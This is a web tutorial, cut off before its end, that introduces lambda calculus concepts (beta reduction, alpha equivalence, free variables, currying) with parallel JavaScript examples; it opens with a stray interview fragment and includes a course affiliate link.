<div><p>I don’t have concrete suggestions. I’ve always wanted to, actually seriously, look into disciplines like architecture and so on, and look at how they, I mean they have journals. They have assessment of things. There must be mechanisms by which they do this, but I’ve never actually sat down and put serious time into seeing what that is. </p><p> I’m kind of more struck by the fact that when you’re at, say ICFP, which is the main functional …</p></div></div></div>

    <p>I have recently become very interested in functional programming - using pure functional languages such as Haskell, as well as functional programming in JavaScript. One of the main areas of study that is often cited as significant for functional programmers is <strong>lambda calculus</strong>.</p>

<p>In this article I want to look at what lambda calculus is, why you might want to learn about it, and explain the key concepts and the terminology of lambda calculus using both lambda syntax and ‘equivalent’ JavaScript code snippets.</p>

<p>If after reading this you are interested in learning more about functional programming in JavaScript, I recommend this Udemy course (affiliate link):</p>

<p><a href="https://click.linksynergy.com/link?id=5FPU6FRy5w4&amp;offerid=507388.1537962&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Ffunctional-programming-for-beginners-with-javascript%2F">Functional Programming For Beginners With JavaScript</a></p>



<p>There are a few reasons to learn lambda calculus, the main ones I can think of are:</p>

<ol>
  <li>
    <p><strong>It embodies some of the most important concepts of functional programming</strong></p>

    <p>For example, pure functions, unary functions, currying.</p>

    <p><strong>The internals of many functional programming languages such as Haskell, are heavily based on lambda calculus</strong></p>

    <p>Understanding lambda calculus will help you to understand these languages.</p>
  </li>
  <li>
    <p><strong>Many concepts from lambda calculus are applicable to general purpose languages such as JavaScript.</strong></p>

    <p>Concepts such as pure functions, unary functions and currying are used in many general purpose programming languages, and are often used in functional JavaScript.</p>

    <p><strong>It is interesting</strong></p>

    <p>Lambda calculus is an interesting area of mathematics, and is relatively accessible to those with a minimal maths background.</p>
  </li>
</ol>



<p>Lambda calculus was invented by the mathematician <a href="https://en.wikipedia.org/wiki/Alonzo_Church">Alonzo Church</a> in the 1930s, and is what is known as a ‘computational model’. By that, I mean that it is a system which can be used to encode and compute algorithmic problems.</p>

<p>The computational model most of us are familiar with is the Turing machine. While lambda calculus is rather different to the Turing machine in its approach to computation, the two are formally equivalent - ie. any problem that can by solved using a Turing machine can be solved using lambda calculus, and vice versa.</p>

<p>That is to say, lambda calculus can be used to solve any problem that can be computed using a Turing machine (so anything that anyone has ever programmed with a computer)!</p>
<h2 id="lambda-calculus-basics">Lambda calculus basics</h2>

<p>Lambda calculus is very minimalistic in its rules/axioms. It is made up of just 3 basic components, or <strong>lambda terms</strong>:</p>

<ol>
  <li>
    <p><strong>Variable</strong> - a named token used in a function, which will be replaced by concrete arguments when the function is applied.</p>
  </li>
  <li>
    <p><strong>Abstraction</strong> - a function, made up of a head and a body separated by a ‘\(.\)’</p>

    <ul>
      <li>The head is a lambda followed by a variable name.</li>
      <li>The body is an expression.</li>
    </ul>
  </li>
  <li>
    <p><strong>Application</strong> - a function invokation.</p>
  </li>
</ol>

<p>An <strong>expression</strong> is a variable, an abstraction, an application, or any combination of these.</p>

<p>In addition, parentheses are used in lambda calculus to indicate the order of evaluation.</p>

<p>This is all we get in lambda calculus! It is quite amazing that using these 3 lambda terms we calculate pretty much anything!</p>

<p>It is worth noting the absence of any of the constructs of basic arithmetic, such as numbers, addition, subtraction, multiplication, division etc - these are not within the basic axioms of lambda calculus.</p>

<p>Numbers and arithmetic operations can be defined in terms of lambda calculus via <a href="https://en.wikipedia.org/wiki/Church_encoding">Church Encoding</a> (which is outside the scope of this article). Rather than working from first principles every time we need them, we can choose to use numbers and basic arithmetic operators for convenience.</p>

<h2 id="a-simple-example---the-identity-function">A simple example - the identity function</h2>

<p>The following function is known as the identity function, it takes a value and returns that same value.</p>

<p>In JavaScript we can easily define and execute this function:</p>

<pre><code>const identity = x =&gt; x;
identity(3) // 3
</code></pre>

<p>We can write the same function using lambda calculus as follows:</p><p>

\[\lambda x . x\]

</p><p>In the above:</p>
<ul>
  <li>\(x\) is a variable.</li>
  <li>
    <p>\(\lambda x . x\) is an abstraction.</p>

    <ul>
      <li>\(\lambda x\) is the head of the abstraction</li>
      <li>\(x\) is the body of the abstraction.</li>
    </ul>
  </li>
</ul>

<p>To perform an application, ie. apply the function to a concrete argument, we use the following syntax:</p><p>

\[(\lambda x . x) \ 3\]

\[[x := 3]\]

\[3\]

</p><p>In the above, the \([x := 3]\) syntax indicates that we are going to substitute all instances of \(x\) in the function with \(3\). The above process is known as beta reduction, which I will talk more about now.</p>

<h2 id="beta-reduction">Beta reduction</h2>

<p>In JavaScript when we invoke a (pure) function with its arguments, the function gets evaluated and it returns the evaluated result:</p>

<pre><code>const f = (x, y) =&gt; x(y);

f(z =&gt; z + 1, 3); // 4
</code></pre>

<p>Here, <code>f</code> takes 2 arguments - a function <code>x</code> and a value <code>y</code>, and calls <code>x</code> with <code>y</code> as an argument.</p>

<p>In lambda calculus, the process of applying concrete arguments to an abstraction, and reducing the resulting expression is known as <strong>beta reduction</strong>.</p>

<p>The equivalent to the above JavaScript function <code>f</code>, when written with lambda calculus, is:</p><p>

\[\lambda x y . x y\]

</p><p>This time, we have an application in the body of the abstraction: \(x y\), this means ‘call \(x\) with \(y\) as an argument’. We can pass arguments to the abstraction and beta reduce it as follows:</p><p>

\[(\lambda x y . x y) \ (\lambda z . z + 1) \ 3\]

\[[x := \lambda z . z + 1]\]

\[(\lambda y . (\lambda z . z + 1) \ y) \ 3\]

\[[z := y]\]

\[(\lambda y . y + 1) \ 3\]

\[[y := 3]\]

\[4\]

</p><p><strong>Beta normal form</strong> is the most simplified form of an expression, ie. when it cannot be beta reduced the terms in an expression any further. In the above example \(4\) is the beta normal form of the application.</p>

<h2 id="alpha-equivalence">Alpha Equivalence</h2>

<p>In JavaScript, renaming a function’s parameters has no effect on the behaviour of the function.</p>

<pre><code>// The following are equivalent.
const myFunc1 = (x, y) =&gt; x * x;
const myFunc2 = (y, x) =&gt; y * y;
</code></pre>

<p>Similarly, in lambda calculus renaming variables within a function also has no effect. We say that abstractions which differ only in their variable names are <strong>alpha equivalent</strong>.</p>

<p>The following is an example of 2 abstractions which are alpha equivalent:</p><p>

\[\lambda x y . xx\]

\[\lambda y x . yy\]

</p><h2 id="bound-and-free-variables">Bound and free variables</h2>

<p>In JavaScript, the return value of a function can be calculated us both its parameters, and variables which the function closes over:</p>

<pre><code>const z = 5;
// z, in the context of our function, is a free variable.
const f = (x, y) =&gt; z + (x * y);

f(2, 3); // 11 === z + 6
</code></pre>

<p>Similarly, lambda calculus abstractions can make use of both variables which are defined in the head of the abstraction, and other, ‘unknown’ variables which are not. In lambda calculus:</p>

<ul>
  <li><strong>Bound variables</strong> are variables used in an abstraction which appear in the head of the abstraction.</li>
  <li><strong>Free variables</strong> are variables used in an abstraction which do not appear in the head, their value is taken to be unknown within the context of the abstraction.</li>
</ul>

<p>If we express the JavaScript function defined above in lambda calculus, we get:</p><p>

\[\lambda x y . z + (x * y)\]

</p><p>And now applying arguments to this function and beta reducing it:</p><p>

\[(\lambda x y . z + (x * y)) \ 2 \ 3\]

\[[x := 2]\]

\[(\lambda y . z + (2 * y)) \ 3\]

\[[y := 3]\]

\[z + 6\]

</p><p>The notable difference here is that in our JavaScript function, we assigned a value to <code>z</code>, whereas in the lambda calculus, we just evaluated the function as far as we could without knowing \(z\).</p>

<p>Even though it is not a numerical result, \(z + 6\) is the beta normal form of this application.</p>

<h2 id="unary-functions-and-currying">Unary functions and currying</h2>

<p>Up until now we have been making a simplification, and viewing lambda functions as functions which take one or more arguments and return a single value.</p>

<p>This is <em>not actually correct</em>.</p>

<p>Every lambda function takes a single argument and returns a single result, and this type of function is know as a <strong>unary function</strong>.</p><p>

\[\lambda x y z . x * y * z\]

</p><p>Is actually shorthand for</p><p>

\[\lambda x . (\lambda y .  (\lambda z . x * y * z))\]

</p><p>This is function with a single parameter \(x\), which when invoked returns another function with a single parameter \(y\), which when invoked returns another function with a single parameter \(z\), which when invoked returns the value of \(x * y * z\)</p>

<p>In JavaScript, the above function looks like:</p>

<pre><code>const f = x =&gt; y =&gt; z =&gt; x * y * z;
</code></pre>

<p>If you have done any functional programming in JavaScript then this way of writing a function may look familiar. Taking a function which takes many arguments, and breaking it down into a series of unary functions (which each take a single argument) is known as <strong>currying</strong>.</p>

<p>We can invoke the above function either by passing all of its arguments and immediately obtaining the final result, or, we can first create a more specific function by passing only some arguments, and then call this function later to get the final result.</p>

<pre><code>// Call our function with 3 arguments.
f(2)(3)(4); // 24

// Call our function with 2 arguments to create a more specialised function.
const multiplyBySix = f(2)(3);

multiplyBySix(4); // 24
</code></pre>

<p>In JavaScript we have the choice to either use curried unary functions, or functions which take more than one argument.</p>

<p>In lambda calculus, all functions are curried unary functions, despite that fact that we often use the aforementioned shorthand which makes them appear as if they take multiple arguments.</p>



<p>Just as not all JavaScript function calls can be evaluated to produce a value, not all lambda functions reduce to a beta normal form upon application. Consider the following, somewhat contrived piece of JavaScript:</p>

<pre><code>const f = x =&gt; x(x);
f(f);
</code></pre>

<p>This is a little confusing. We define a function <code>f</code>, which takes a function <code>x</code> and calls it with itself as an argument. On the next line, we call <code>f</code> with itself, which will recursively continue to call f with itself, and mayhem ensues.</p>

<p>If you execute the above code, you will get a max call stack size exceeded error. Conceptually we can think of what happens as something like:</p>

<pre><code>f(f(f(f(f(f(...)))))); // and so on, until we reach the maximum call stack size.
</code></pre>

<p>In lambda …</p></div></div>
